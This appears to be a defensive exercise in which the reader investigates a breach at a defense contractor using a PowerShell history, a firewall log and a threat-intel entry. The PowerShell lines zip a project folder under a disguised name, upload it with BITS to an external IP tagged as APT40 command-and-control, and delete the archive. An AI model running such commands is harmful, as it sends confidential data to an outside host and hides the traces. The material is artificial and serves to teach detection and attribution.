## Full Exfil Hunt and Attribution

You are investigating a breach at a defense contractor. Three data points have been collected from different sources.

---

**Endpoint - PowerShell history on workstation WS-14:**
```powershell
Compress-Archive -Path C:\Projects\NavalSpec_2024\ -DestinationPath C:\Windows\Temp\patch_cache.zip
Start-BitsTransfer -Source C:\Windows\Temp\patch_cache.zip `
                   -Destination http://45.76.112.88/drop/patch_cache.zip `
                   -TransferType Upload
Remove-Item C:\Windows\Temp\patch_cache.zip -Force
```

---

**Network - Firewall log for WS-14 around the same time:**
```
[2024-04-02 03:44:10] OUTBOUND ALLOW  BITS  →  45.76.112.88:80   112 MB
[2024-04-02 03:44:11] OUTBOUND ALLOW  BITS  →  45.76.112.88:80   (resumed)
[2024-04-02 03:51:02] OUTBOUND ALLOW  BITS  →  45.76.112.88:80   (completed)
```

---

**Threat Intel - Internal feed entry:**
```
IP: 45.76.112.88
Tags: Leviathan, APT40, C2 infrastructure
Last seen: 2024-03-29
Confidence: HIGH
```
